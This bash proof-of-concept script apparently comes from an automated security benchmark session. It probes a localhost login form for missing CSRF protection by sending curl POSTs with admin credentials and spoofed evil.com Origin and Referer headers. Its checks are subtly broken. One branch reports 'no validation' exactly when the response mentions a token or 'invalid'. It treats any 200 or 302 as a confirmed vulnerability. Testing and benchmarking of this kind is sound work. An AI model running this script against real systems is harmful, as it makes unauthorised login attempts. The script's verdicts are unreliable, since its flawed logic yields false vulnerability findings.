#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login form by sending a cross-origin POST request without CSRF token validation
# Target: ./repo
# Created: 2025-11-07T22:19:30.997Z
# Session: benchmark-XBEN-088-24-mhpe87h9

# CSRF Vulnerability POC - Missing CSRF Protection on Login Form
# This script demonstrates that the /login endpoint accepts cross-origin requests
# without requiring CSRF tokens or validating request origin.

TARGET_URL="http://localhost/login"
EVIL_ORIGIN="http://evil.com"
EVIL_REFERER="http://evil.com/attack"

echo "[*] Testing CSRF Protection on Login Form"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing cross-origin POST request..."
echo ""

# Send cross-origin POST request with fake origin and referer
RESPONSE=$(curl -s -w "\n%{http_code}" \
  -X POST "$TARGET_URL" \
  -d "username=admin&password=test" \
  -H "Origin: $EVIL_ORIGIN" \
  -H "Referer: $EVIL_REFERER" \
  -H "Content-Type: application/x-www-form-urlencoded")

# Parse response
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Check for CSRF vulnerability indicators
if echo "$BODY" | grep -q "session="; then
    echo "[+] VULNERABLE: Session cookie set in response"
    SESSION=$(echo "$BODY" | grep -oP 'session=[^;]+' | head -1)
    echo "[+] Session Cookie: $SESSION"
    CSRF_VULNERABLE=1
elif [ "$HTTP_CODE" == "200" ]; then
    echo "[+] VULNERABLE: Accepted cross-origin request without CSRF token"
    CSRF_VULNERABLE=1
else
    echo "[-] Response HTTP Code: $HTTP_CODE"
fi

echo ""

# Additional check: Verify no CSRF token validation
if curl -s -X POST "$TARGET_URL" \
  -d "username=admin&password=test&csrf_token=invalid" \
  -H "Origin: $EVIL_ORIGIN" \
  -H "Referer: $EVIL_REFERER" | grep -q "CSRF\|token\|invalid"; then
    echo "[*] No CSRF token validation detected"
else
    echo "[+] Endpoint does not validate CSRF tokens"
fi

echo ""
echo "[*] Attempting login without CSRF token..."

# Try basic login without any CSRF protections
RESPONSE2=$(curl -s -w "\n%{http_code}" \
  -X POST "$TARGET_URL" \
  -d "username=admin&password=test" \
  -H "Origin: $EVIL_ORIGIN" \
  -H "Referer: $EVIL_REFERER" \
  -c /tmp/cookies.txt)

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "[*] Response Status: $HTTP_CODE2"

# Check if login was processed (200 OK or 302 redirect typically indicate processing)
if [ "$HTTP_CODE2" == "200" ] || [ "$HTTP_CODE2" == "302" ]; then
    echo "[+] CSRF VULNERABILITY CONFIRMED: Cross-origin login request accepted"
    echo "[+] No CSRF token required or validated"
    exit 0
else
    echo "[!] Unexpected response code: $HTTP_CODE2"
    exit 1
fi